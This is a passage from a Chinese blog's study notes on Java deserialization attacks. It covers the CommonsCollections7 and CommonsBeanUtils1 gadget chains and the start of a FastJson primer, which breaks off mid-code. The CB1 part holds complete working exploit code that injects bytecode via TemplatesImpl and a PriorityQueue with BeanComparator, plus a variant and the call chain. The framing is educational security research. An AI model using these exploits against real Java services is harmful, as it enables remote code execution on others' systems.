alt="iTransformers"></p><p>通过反射获取<code>ChainedTransformer</code>的<code>iTransformers</code>变量，将含有我们反序列化时要执行的命令的<code>transformers</code>数组传进去，替换前面的<code>fakeTransformers</code>；</p><p>为什么要删除<code>lazymap2</code>中的<code>yy</code>键值对？这个键值对是从哪里来的？</p><p>Hashtable在调用put方法添加元素的时候会调用equals方法判断是否为同一对象，而在equals中会调用LazyMap的get方法添加一个元素（yy&#x3D;yy）。</p><p>唉，我是懒狗，具体可以看这位师傅的分析：</p><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">yy&#x3D;yy</a></p><p>如果不把这个<code>yy</code>删掉，反序列化走到<code>AbstractMap</code>的<code>equals</code>时：</p><p><img src="/img/equal.png" alt="equal"></p><p>可以看到当两个<code>size</code>不相等就直接返回<code>False</code>了。</p><h2 id="CommonsBeanUtils1"><a href="#CommonsBeanUtils1" class="headerlink" title="CommonsBeanUtils1"></a>CommonsBeanUtils1</h2><p><a href="https://drun1baby.top/2022/07/12/CommonsBeanUtils%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#0x04-CommonsBeanUtils1-%E9%93%BE%E5%AD%90%E5%88%86%E6%9E%90">参考文章</a></p><p>首先Commons-BeanUtils 中提供了一个静态方法 <code>PropertyUtils.getProperty</code> ，让使用者可以直接调用任意 JavaBean 的 getter 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//Baby.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Baby</span> &#123;  <br>    <span class="hljs-keyword">private</span> <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Drunkbaby&quot;</span>;  <br>  <br> <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span>&#123;  <br>        <span class="hljs-keyword">return</span> name;  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span> <span class="hljs-params">(String name)</span> &#123;  <br>        <span class="hljs-built_in">this</span>.name = name;  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//CBMethods.java</span><br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CBMethods</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        System.out.println(PropertyUtils.getProperty(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Baby</span>(), <span class="hljs-string">&quot;name&quot;</span>));  <br> &#125;  <br>&#125;<br><span class="hljs-comment">//结果：Drunkbaby</span><br></code></pre></td></tr></table></figure><p>利用点就是可以用这个静态方法去调静态类加载那章中的<code>getOutputProperties()</code>，可以执行命令。</p><p>(动态类加载那里就不细说了，就是CC3那些)</p><p><code>BeanComparator.compare()</code> 方法：</p><p><img src="/img/compare.png" alt="compare"></p><p>这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。</p><p>所以如果需要传值比较，肯定是需要新建一个 <code>PriorityQueue</code> 的队列，并让其有 2 个值进行比较。而且 <code>PriorityQueue</code> 的构造函数当中就包含了一个比较器。</p><p><img src="/img/PriorityConstructor.png" alt="PriorityConstructor"></p><p>最后使用 queue.add 就可以自动完成比较是因为 add 方法调用了 compare 方法，如图</p><p><img src="/img/Route.png" alt="Route"></p><p>所以初步EXP:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonBeans1EXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br> <span class="hljs-comment">// 将 property 的值赋为 outputProperties </span><br> setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br> <span class="hljs-comment">// 创建新的队列，并添加恶意字节码  </span><br> <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);  <br> queue.add(templates);  <span class="hljs-comment">//add最终调用comparator.compare，这里的comparator被赋值为beanComparator。</span><br> queue.add(templates);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到<code>new</code>了两个实例：<code>beanComparator</code>和<code>PriorityQueue</code>，这里先看下它俩的构造函数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br><span class="hljs-comment">//BeanComparator的构造方法</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanComparator</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>, Serializable &#123;<br>    <span class="hljs-keyword">private</span> String property;<br>    <span class="hljs-keyword">private</span> Comparator comparator;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里就是<code>new</code>了一个<code>BeanComparator</code>，等下要利用这个类中的方法去调用<code>(get)Property</code>方法，如图：</p><p><img src="/img/FindCompare.png" alt="FindCompare"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator); <br></code></pre></td></tr></table></figure><p><code>new</code>了一个<code>PriorityQueue</code>实例，看下它的构造函数:</p><p><img src="/img/priorityquee.png" alt="priorityquee"></p><p>所以这个队列里容纳的初始元素为2，然后<code>comparator</code>为<code>beanComparator</code>，然后<code>PriorityQueue</code> 这个类的 <code>siftDownUsingComparator()</code> 方法会调用 <code>compare()</code>:</p><p><img src="/img/siftDownUsingComparator.png" alt="siftDownUsingComparator"></p><p>最终就成了<code>BeanComparator.compare()</code></p><p>简单梳理一下：</p><p><code>queue.add(templates);</code> add最终调用<code>comparator.compare</code>，这里的<code>comparator</code>被赋值为<code>beanComparator</code>，即<code>beanComparator.compare</code></p><p>然后这个<code>compare</code>方法回去调<code>PropertyUtils.getProperty(o1, propeery)</code>。这里<code>property</code>的值为<code>outputProperties</code>。<code>o1</code>需要是<code>TemplatesImpl</code>的实例即上面那个<code>templates</code>。</p><p> <code>queue.add(templates);  </code>这里的<code>templates</code>就相当于要被比较的<code>o1，o2</code>了。</p><p>走到<code>compare</code>就相当于这个：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">templates</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>)</span><br></code></pre></td></tr></table></figure><p>然后注意<code>add</code>的时候也会走到最终的<code>compare</code>方法，我们的目标是让他反序列化时才触发。这里思路就跟前面那几条改值的链子一样：先放个没啥用的变量进去，然后通过反射修改就行。</p><p>最终EXP：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;  <br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;  <br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.PropertyUtils;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Field;  <br><span class="hljs-keyword">import</span> java.nio.file.Files;  <br><span class="hljs-keyword">import</span> java.nio.file.Paths;  <br><span class="hljs-keyword">import</span> java.util.PriorityQueue;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CB1FinalEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\JavaClass\\TemplatesBytes.class&quot;</span>));  <br> <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();  <br> setFieldValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;Calc&quot;</span>);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][] &#123;code&#125;);  <br> setFieldValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());  <br> <span class="hljs-comment">//    templates.newTransformer();  </span><br> <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">beanComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();  <br> <span class="hljs-comment">// 创建新的队列，并添加恶意字节码  </span><br> <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>, beanComparator);  <br> queue.add(<span class="hljs-number">1</span>);  <br> queue.add(<span class="hljs-number">1</span>);  <br>  <br> <span class="hljs-comment">//可以看下beanComparator的构造方法：这里把property的值设置为outputProperties，目的是调用getOutputProperties()这个方法</span><br> setFieldValue(beanComparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);  <br><br> setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates, templates&#125;);  <br> serialize(queue);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);  <br> field.setAccessible(<span class="hljs-literal">true</span>);  <br> field.set(obj, value);  <br> &#125;  <br>  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>heapify<span class="hljs-literal">()</span>  -&gt;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">Down()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>sift<span class="hljs-constructor">DownUsingComparator()</span> -&gt;<br><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span> -&gt;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property(<span class="hljs-params">templatesImpl</span>, <span class="hljs-params">outputProperties</span>)</span><br>-&gt;<br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span><span class="hljs-keyword">new</span><span class="hljs-constructor">Transformer()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">TransletInstance()</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>define<span class="hljs-constructor">TransletClasses()</span><br></code></pre></td></tr></table></figure><p><img src="/img/cb1.png" alt="cb1"></p><p>网上看了其它师傅的写法，还能这么写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;E:\\Clac.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes=&#123;code&#125;;<br>        TemplatesImpl templates=<span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(templates,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-literal">null</span>);<br>        setFieldValue(templates,<span class="hljs-string">&quot;_bytecodes&quot;</span>,codes);<br>        BeanComparator beanComparator=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">AttrCompare</span>());<br>        BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>        priorityQueue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        priorityQueue.add(<span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(beanComparator,<span class="hljs-string">&quot;property&quot;</span>,<span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates,templates&#125;);<br>        setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br><br>        <span class="hljs-comment">//serialize(priorityQueue);</span><br>       unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br></code></pre></td></tr></table></figure><p>可以看到就多了这几个东西：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator beanComparator1=<span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>PriorityQueue priorityQueue=<span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(beanComparator1);<br>setFieldValue(priorityQueue,<span class="hljs-string">&quot;comparator&quot;</span>,beanComparator);<br></code></pre></td></tr></table></figure><p>其实目标还是保证<code>add</code>的时候不弹计算器，所以放了假的<code>queue</code>和<code>comparator</code>进去，效果是一样的</p><p><a href="https://xz.aliyun.com/t/10457">参考文章</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">CC7</a></p><p><a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8BCommonsBeanUtils1/">参考文章</a></p><p>等等等。。。</p>]]></content>
    
    
    
    <tags>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全初探_FastJson学习笔记</title>
    <link href="/2024/04/27/FastJson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2024/04/27/FastJson%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<p>一些有关FastJson的学习笔记</p><span id="more"></span><p>只做简单记录，具体参考这两位师傅的文章：</p><p><a href="https://drun1baby.top/2022/08/04/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Fastjson%E7%AF%8701-Fastjson%E5%9F%BA%E7%A1%80/#Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-Fastjson-%E7%AF%87-01-Fastjson-%E5%9F%BA%E7%A1%80">1</a></p><p><a href="https://xz.aliyun.com/t/12096">2</a></p><p>学习视频：</p><p><a href="https://www.bilibili.com/video/BV1bD4y117Qh">3</a></p><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p><code>Fastjson</code>提供两个主要接口来分别实现序列化和反序列化操作：</p><p><code>JSON.toJSONString</code> 将 Java 对象转换为 json 对象，序列化的过程。</p><p><code>JSON.parseObject/JSON.parse</code> 将 json 对象重新变回 Java 对象，反序列化的过程</p><p>用法示例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">jsonString</span> <span class="hljs-operator">=</span> JSON.toJSONString(student);<br></code></pre></td></tr></table></figure><ul><li><code>JSON.toJSONString</code> 是 Fastjson 库中用于将 Java 对象转换为 JSON 字符串的方法。</li><li><code>student</code> 是要转换为 JSON 字符串的 Java 对象。</li></ul><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>比如对于如下Javabean类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//User.java</span><br><span class="hljs-keyword">package</span> MyJson;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> id;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;无参构造&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">User</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> id)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;有参构造&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;调用了toString!&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;User&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, id=&quot;</span> + id +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        System.out.print(<span class="hljs-string">&quot;getName&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setName&quot;</span>);<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;getId&quot;</span>);<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;setId&quot;</span>);<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br>&#125;<br><span class="hljs-comment">//UserSer.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserSer</span> &#123;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title 